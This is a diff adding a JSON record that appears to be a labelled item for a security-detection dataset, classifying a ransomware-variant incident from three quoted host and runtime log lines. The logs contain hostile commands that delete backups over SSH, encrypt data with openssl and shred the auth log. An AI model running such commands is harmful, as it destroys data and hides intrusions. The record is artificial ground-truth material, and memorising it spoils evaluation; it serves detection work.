@@ -1,0 +1,41 @@
+{
+ "unit": 1100,
+ "gt": {
+  "gt_class": "family_variant",
+  "gt_case": "CASE-005",
+  "confidence": "medium",
+  "needs_review": true,
+  "reason": "勒索家族变体：阶段组合与 CASE-005 不完全一致"
+ },
+ "technique": "Web 接口触发横向扩散后加密多台主机并清理认证日志",
+ "sources": [
+  "rasp",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-05 11:20:47",
+   "source": "rasp",
+   "log_id": "RASP0480738",
+   "content": "https://app-spring-142.ops-corp.com/api/v2/tasks/run {\"cmd\": \"bash deploy.sh --hosts 10.20.8.0/24\", \"template\"",
+   "event_id": "1100-RASP0480738"
+  },
+  {
+   "timestamp": "2026-07-05 11:22:15",
+   "source": "hids",
+   "log_id": "HID0470886",
+   "content": "for h in 10.20.8.11 10.20.8.12; do ssh root@$h \"rm -rf /backup/*\"; done ssh ssh for h in <== /bin/bash -c 'for",
+   "event_id": "1100-HID0470886"
+  },
+  {
+   "timestamp": "2026-07-05 11:27:55",
+   "source": "hids",
+   "log_id": "HID0470916",
+   "content": "openssl enc -aes-256-cbc -pass file:/tmp/.k -in /srv/vm -out /srv/vm.enc && shred -u /var/log/auth.log <== /bi",
+   "event_id": "1100-HID0470916"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
